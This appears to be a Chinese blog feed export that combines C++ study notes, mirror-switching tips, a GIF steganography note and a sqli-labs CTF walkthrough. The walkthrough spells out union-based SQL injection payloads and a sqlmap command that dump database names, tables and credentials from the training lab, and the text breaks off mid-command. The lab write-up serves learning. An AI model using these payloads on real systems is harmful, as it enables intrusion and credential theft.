      <link href="/2020/03/19/%E5%90%84%E7%A7%8D%E6%8D%A2%E6%BA%90/"/>
      <url>/2020/03/19/%E5%90%84%E7%A7%8D%E6%8D%A2%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h3 id="ubuntu18更换国内源"><a href="#ubuntu18更换国内源" class="headerlink" title="ubuntu18更换国内源"></a>ubuntu18更换国内源</h3><p>按照一篇很详细的博文完成了Ubuntu18的换源操作。。<br><a href="https://blog.csdn.net/daerzei/article/details/84873964" target="_blank" rel="noopener">荒野雄兵的博文</a></p><h3 id="pip更换国内源"><a href="#pip更换国内源" class="headerlink" title="pip更换国内源"></a>pip更换国内源</h3><p>临时<br>sudo pip install 包名 -i 镜像站</p><p><a href="https://www.linuxidc.com/Linux/2019-04/158178.htm" target="_blank" rel="noopener">linux公社里的一篇文章</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 换源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于c++的递归</title>
      <link href="/2020/03/18/%E5%85%B3%E4%BA%8Ec++%E7%9A%84%E9%80%92%E5%BD%92/"/>
      <url>/2020/03/18/%E5%85%B3%E4%BA%8Ec++%E7%9A%84%E9%80%92%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<h3 id="递归—感到理解吃力"><a href="#递归—感到理解吃力" class="headerlink" title="递归—感到理解吃力"></a>递归—感到理解吃力</h3><a id="more"></a><h5 id="这是一个找固定数目元素数组中的最大值的递归算法。"><a href="#这是一个找固定数目元素数组中的最大值的递归算法。" class="headerlink" title="这是一个找固定数目元素数组中的最大值的递归算法。"></a>这是一个找固定数目元素数组中的最大值的递归算法。</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a[<span class="number">100</span>],<span class="keyword">int</span> n)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; f(a,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a[<span class="number">100</span>],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> (f(a,n<span class="number">-1</span>) &gt; a[n<span class="number">-1</span>]) ? f(a,n<span class="number">-1</span>) : a[n<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="下面的我感觉是一个经典的递归算法"><a href="#下面的我感觉是一个经典的递归算法" class="headerlink" title="下面的我感觉是一个经典的递归算法"></a>下面的我感觉是一个经典的递归算法</h3><h5 id="递归逆序数组元素"><a href="#递归逆序数组元素" class="headerlink" title="递归逆序数组元素"></a>递归逆序数组元素</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a[<span class="number">100</span>],<span class="keyword">int</span> n)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    f(a,n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; a[i];</span><br><span class="line">        <span class="keyword">if</span> (i != n<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a[<span class="number">100</span>],<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">if</span>(n &gt;= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f(a+<span class="number">1</span>,n<span class="number">-2</span>);</span><br><span class="line">        temp = a[<span class="number">0</span>];</span><br><span class="line">        a[<span class="number">0</span>] = a[n<span class="number">-1</span>];</span><br><span class="line">        a[n<span class="number">-1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> 递归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20年上半年c++</title>
      <link href="/2020/03/18/20%E5%B9%B4%E4%B8%8A%E5%8D%8A%E5%B9%B4c++/"/>
      <url>/2020/03/18/20%E5%B9%B4%E4%B8%8A%E5%8D%8A%E5%B9%B4c++/</url>
      
        <content type="html"><![CDATA[<h3 id="c"><a href="#c" class="headerlink" title="c++"></a>c++</h3><a id="more"></a><p>&emsp;&emsp;1.函数运用在程序中会大大减少程序员的代码量。<br>&emsp;&emsp;2.函数传参：值传递，引用传递，指针传递。只有值传递不会对实参的值产生影响。<br>&emsp;&emsp;3.函数传参时可以传递数组，而在函数中对数组的改变同样会影响实际的数组里的元素。<br>&emsp;&emsp;4.应用传递数组的函数时，只需输入数组名就行了。不需要带上[方括号]。</p><p>&emsp;&emsp;5.下面五个是字符串库<ctring>的函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6.</span><span class="built_in">strcpy</span>(s1, s2);  复制字符串 s2 到字符串 s1。</span><br><span class="line"><span class="number">7.</span><span class="built_in">strcat</span>(s1, s2);  连接字符串 s2 到字符串 s1 的末尾。</span><br><span class="line"><span class="number">8.</span><span class="built_in">strlen</span>(s1);  返回字符串 s1 的长度。</span><br><span class="line"><span class="number">9.</span><span class="built_in">strcmp</span>(s1, s2);  如果 s1 和 s2 是相同的，则返回 <span class="number">0</span>；如果 s1&lt;s2 则返回值小于 <span class="number">0</span>；如果s1&gt;s2 则返回值大于 <span class="number">0</span>。</span><br><span class="line"><span class="number">10.</span><span class="built_in">strchr</span>(s1, ch);  返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</span><br><span class="line"><span class="number">11.</span><span class="built_in">strstr</span>(s1, s2);  返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。</span><br><span class="line"><span class="number">12.</span>第十个和第十一个之间的不同就是，对于要找的字符串，<span class="number">10</span>要找的是一个固定的字符串，而<span class="number">11</span>是字符串变量，可以被赋值。</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;ss13.指针 int *p; 整型指针变量的声明，ip = &amp;a；将变量a的地址存储到指针变量中。</p><h3 id="3月18号-11：17"><a href="#3月18号-11：17" class="headerlink" title="3月18号 11：17"></a>3月18号 11：17</h3><h5 id="函数重载的解释与好处-——摘自mooc"><a href="#函数重载的解释与好处-——摘自mooc" class="headerlink" title="函数重载的解释与好处    ——摘自mooc"></a>函数重载的解释与好处    ——摘自mooc</h5><ul><li>函数的重载就是函数名相同，但函数形参的次序、个数、类型不同的函数。</li></ul><p>好处：重载函数通常用来命名一组功能相似的函数，这样做减少了函数名的数量，避免了名字空间的污染，对于程序的可读性有很大的好处。当函数的编写者充分考虑了不同情况下应该运行稍有不同的函数，函数的使用者就不必为这些小细节而烦恼了。</p><h3 id="4月11号-21：25"><a href="#4月11号-21：25" class="headerlink" title="4月11号 21：25"></a>4月11号 21：25</h3><h5 id="第八周学习总结"><a href="#第八周学习总结" class="headerlink" title="第八周学习总结"></a>第八周学习总结</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1.</span>C++语言规定，数组名代表数组的首地址(即数组中第一个元素的地址)，它是一个常量指针。</span><br><span class="line">如: <span class="keyword">int</span> a[<span class="number">10</span>]，*p=a;</span><br><span class="line">说明a是一个整型数组，p是一个整型的指针变量，且p指向a数组，其中a为数组名，代表数组的首地址，即&amp;a[<span class="number">0</span>]。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 指针的算术运算</span><br><span class="line">(<span class="number">1</span>)指针 +(-) 整数=指针</span><br><span class="line">&lt;C++中指针的算术运算与指针指向的变量类型有关，如p指向<span class="keyword">int</span>型，因为<span class="keyword">int</span>型变量为<span class="number">4</span>字节长度，所以，p+<span class="number">1</span>相当于p+<span class="number">4</span>,同样p+i相当于p+i*<span class="number">4</span>。&gt;</span><br><span class="line">(<span class="number">2</span>)指针<span class="number">2</span> - 指针<span class="number">1</span> = 整数</span><br><span class="line">(<span class="number">3</span>)指针的关系运算(即:两个指针可以比较大小)</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>指针动态申请堆内存空间</span><br><span class="line">(<span class="number">1</span>)指针变量 = <span class="keyword">new</span> 数据类型；</span><br><span class="line">(<span class="number">2</span>)指针变量 = <span class="keyword">new</span> 数据类型 [n]；<span class="comment">//申请n个指定数据类型空间</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>释放空间</span><br><span class="line">(<span class="number">1</span>)<span class="keyword">delete</span> 指针变量；</span><br><span class="line">(<span class="number">2</span>)<span class="keyword">delete</span> []指针变量；<span class="comment">//释放数组空间</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>申请过的内存一定要记得释放，否则可能会造成内存泄漏。</span><br><span class="line"><span class="number">6.</span>结构体变量可以整体赋值。</span><br><span class="line"><span class="number">7.</span> p+<span class="number">1</span> 相当于 p的地址 + <span class="number">1</span> * 数据类型所占位数。</span><br><span class="line"><span class="number">8.</span>只有当两个指针指向同一个数组中的元素时，才能进行关系运算。</span><br><span class="line"><span class="number">9.</span> 结构类型 *p；定义了一个结构体类型的指针变量。</span><br><span class="line"><span class="number">10.</span>二维指针 * *p 可以指向一维指针，指向指针的指针。可用于表示二维数组。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf隐写</title>
      <link href="/2020/03/08/ctf%E9%9A%90%E5%86%99/"/>
      <url>/2020/03/08/ctf%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h3 id="1-gif隐写"><a href="#1-gif隐写" class="headerlink" title="1.gif隐写"></a>1.gif隐写</h3><p><a href="https://dev.gameres.com/Program/Visual/Other%20/GIFDoc.htm" target="_blank" rel="noopener">GIF文档URL</a><br>gif的六个重要的点:<code>&#39;G&#39; &#39;I&#39; &#39;F&#39; &#39;8&#39; &#39;7&#39;或&#39;9&#39; &#39;a&#39;</code>。<br>gif文件不能打开的原因一般就是修改了这几个值，因为修改的地方不能太多，而且不能太难看出来。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020上半年c++代码</title>
      <link href="/2020/02/27/2020%E4%B8%8A%E5%8D%8A%E5%B9%B4c++%E4%BB%A3%E7%A0%81/"/>
      <url>/2020/02/27/2020%E4%B8%8A%E5%8D%8A%E5%B9%B4c++%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h5 id="8-小算法-美分找钱"><a href="#8-小算法-美分找钱" class="headerlink" title="8.小算法-美分找钱"></a>8.小算法-美分找钱</h5><a id="more"></a><p>这道算法题不是很简单，特别记录下。为了更具美感地排面，这道题目的描述我放在了代码块里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line"></span><br><span class="line">将n美分转换成25、10、5和1美分的硬币总共有多少种转换方法？</span><br><span class="line"></span><br><span class="line">运行结果如下：</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line"></span><br><span class="line">13</span><br><span class="line"></span><br><span class="line">如果n不在0~99之间，输出提示信息“the money is invalid!”</span><br><span class="line"></span><br><span class="line">运行结果如下：</span><br><span class="line"></span><br><span class="line">101</span><br><span class="line"></span><br><span class="line">the money is invalid!</span><br><span class="line"></span><br><span class="line">输入格式:</span><br><span class="line"></span><br><span class="line">整数，表示美分数</span><br><span class="line"></span><br><span class="line">输入可能不是[0,99]之间的整数。输入不在该区间时，输出为“the money is invalid!”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出格式：</span><br><span class="line"></span><br><span class="line">转换方法数或者提示信息“the money is invalid!”（不带引号啊，单词间只有一个空格）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入样例：</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出样例：</span><br><span class="line"></span><br><span class="line">13</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a,b,c,num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span> (n&lt;<span class="number">0</span> || n &gt; <span class="number">99</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"the money is invalid!\n"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (a=n/<span class="number">25</span>;a&gt;=<span class="number">0</span>;a--)  <span class="comment">//a:25美元这么多张</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp1 = n<span class="number">-25</span>*a;    <span class="comment">//temp1:10美元现在这么多张</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> b=temp1/<span class="number">10</span>;b&gt;=<span class="number">0</span>;b--)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> temp2 = temp1 - <span class="number">10</span>*b;   <span class="comment">//c:5美元现在这么多张</span></span><br><span class="line">                <span class="keyword">for</span> (c=temp2/<span class="number">5</span>;c&gt;=<span class="number">0</span>;c--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="number">25</span>*a+<span class="number">10</span>*b+<span class="number">5</span>*c+(n<span class="number">-25</span>*a<span class="number">-10</span>*b<span class="number">-5</span>*c) == n)</span><br><span class="line">                        &#123;</span><br><span class="line">                            num +=<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数作为函数参数的最简单的应用"><a href="#函数作为函数参数的最简单的应用" class="headerlink" title="函数作为函数参数的最简单的应用"></a>函数作为函数参数的最简单的应用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">anyfun</span><span class="params">(<span class="keyword">double</span> (*f)(<span class="keyword">double</span>),<span class="keyword">double</span> x)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">x2</span><span class="params">(<span class="keyword">double</span> x)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">mysin</span><span class="params">(<span class="keyword">double</span> x)</span></span>;</span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; anyfun(x2,x) &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; anyfun(mysin,x) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">x2</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mysin</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">sin</span>(<span class="number">2</span>*<span class="number">3.14</span>*<span class="number">2</span>*x+<span class="number">3.14</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">anyfun</span><span class="params">(<span class="keyword">double</span> (*f)(<span class="keyword">double</span>),<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (*f)(x);  <span class="comment">//这里一定要记清楚(*f)(二层参数)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2020/02/23/sqli-labs/"/>
      <url>/2020/02/23/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h5 id="根据上一次upload的教训，我在buu上新开了一个环境。反正比自己搭环境简单多了。"><a href="#根据上一次upload的教训，我在buu上新开了一个环境。反正比自己搭环境简单多了。" class="headerlink" title="根据上一次upload的教训，我在buu上新开了一个环境。反正比自己搭环境简单多了。"></a>根据上一次upload的教训，我在buu上新开了一个环境。反正比自己搭环境简单多了。</h5><a id="more"></a><p>s</p><h3 id="less-1"><a href="#less-1" class="headerlink" title="less - 1"></a>less - 1</h3><p>&emsp;&emsp;根据题目提示，输入<code>?id=1</code>显示正常。加个单引号，payload改为<code>?id=1&#39;</code>出错。根据<code>?id=1&#39; --+</code>回显正常可知，是单引号字符型注入。</p><blockquote><p>information_schema，系统数据库，包含所有数据库相关信息。<br>information_schema.schemata中schema_name列，字段为所有数据库名称。<br>information_schema.tables中table_name列对应数据库所有表名，其中table_schema列是所有数据库名。<br>information_schema.columns中，column_name列对应所有列名，其中table_schema列也对应所有数据库名，table_name列也对应所有表名。</p></blockquote><p>&emsp;&emsp;<img src= "/img/loading.gif" data-src="https://s2.ax1x.com/2020/02/24/382QAS.png" alt="382QAS.png"><br>&emsp;&emsp;1.使用<code>order by</code>查列数，<code>order by</code>语法为：<code>ORDER BY column1 [ASC|DESC], column2 [ASC|DESC]</code>, … 此处以数字1,2,3…指定以某一列为<code>key</code>进行排序，通过尝试得出列数,得出列数为3。因为<code>order by 3 --+</code>时正常，而<code>order by 4 --+</code>时出错，由此判断出列数为<code>3</code>。</p><p>&emsp;&emsp;2.接着进行联合注入，通过回显爆出表名，列名，字段，用户名和密码。</p><p>&emsp;&emsp;3.爆数据库名:?id=-1’ union select 1,group_concat(<code>schema_name</code>),3 from <code>information_schema.schemata</code> –+，发现有这几个数据库<code>ctftraining,information_schema,mysql,performance_schema,security,test</code>，</p><p>&emsp;&emsp;4.爆<code>security</code>数据库。payload为：?id=0’ union select 1,group_concat(<code>table_name</code>),3 from <code>information_schema.tables</code> where <code>table_schema=&quot;security&quot; --+</code>，数据库名在<code>table_schema</code>内。发现表<code>emails,referers,uagents,users</code>,用户名密码应该就在<code>users</code>里边。</p><p>&emsp;&emsp;5.爆<code>users</code>表，payload为：?id=-1’ union select 1,group_concat(<code>column_name</code>),3 from <code>information_schema.columns</code> where <code>table_name=&#39;users&#39;</code> –+，获得字段名为<code>id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code>,用户名为<code>username</code>，密码为<code>password</code>。</p><p>&emsp;&emsp;6.获取所有的用户名和密码，前面的部分算是猜解重要的数据所在的字段，payload为:?id=-1’ union select 1,group_concat(<code>concat_ws(&quot;---&quot;,username,password)</code>),3 from <code>users</code> –+</p><p>&emsp;&emsp;这是我获得的用户名和密码<code>Dumb---Dumb,Angelina---I-kill-you,Dummy---p@ssword,secure---crappy,stupid---stupidity,superman---genious,batman---mob!le,admin---admin</code></p><h3 id="less-2"><a href="#less-2" class="headerlink" title="less - 2"></a>less - 2</h3><p>&emsp;&emsp;因为payload为<code>id=1&#39;</code>时报错，而且payload为<code>id=1&#39; --+</code>同样报错，判断是数字型注入。<br>&emsp;&emsp;所以payload为<code>?id=-1 union select 1,group_concat(concat_ws(&quot;---&quot;,username,password)),3 from users</code>，直接就这样就行了。</p><h3 id="less-3"><a href="#less-3" class="headerlink" title="less - 3"></a>less - 3</h3><p>&emsp;&emsp;输入<code>id=1&#39;</code>，回显语法错误，根据<code>use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code>判断输入的内容存放到一对单引号加圆括号中了。果然payload为<code>?id=1&#39;) --+</code>没有回显错误。</p><p>&emsp;&emsp;payload为：<code>?id=-1&#39;) union select 1,group_concat(concat_ws(&quot;---&quot;,username,password)),3 from users --+</code>,直接就行了。</p><h3 id="less-4"><a href="#less-4" class="headerlink" title="less - 4"></a>less - 4</h3><p>&emsp;&emsp;输入<code>id=1&quot;</code>，回显语法错误，根据<code>to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code>判断输入的内容存放到一对双引号加圆括号中了。<br>&emsp;&emsp;payload为：<code>?id=-1&quot;) union select 1,group_concat(concat_ws(&quot;---&quot;,username,password)),3 from users --+</code>,成功爆值。</p><h3 id="less-5"><a href="#less-5" class="headerlink" title="less - 5"></a>less - 5</h3><p>&emsp;&emsp;输入<code>?id=1&#39;</code>报错<code>to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code>,判断应该是字符型注入。但是使用第一关的payload似乎没有用，出现了这个<code>You are in...........</code>，不知道是怎么回事。看wp似乎是报错型注入。有点麻烦，用sqlmap跑一下吧，好久没用了，再熟练一下。</p><p>&emsp;&emsp;1.<code>sqlmap -u &quot;http://6ff3dacb-9470-4d75-bc2b-49036315bc99.node3.buuoj.cn/Less-5/?id=1&quot; --dbs --level=3 --batch</code></p><p>&emsp;&emsp;在sqlmap里可以很明显的看到有两种注入方式，一个是<code>boolean-based blind</code>另一个是<code>error-based</code>，一个盲注，一个报错注入。</p><p>&emsp;&emsp;2.<code>sqlmap -u 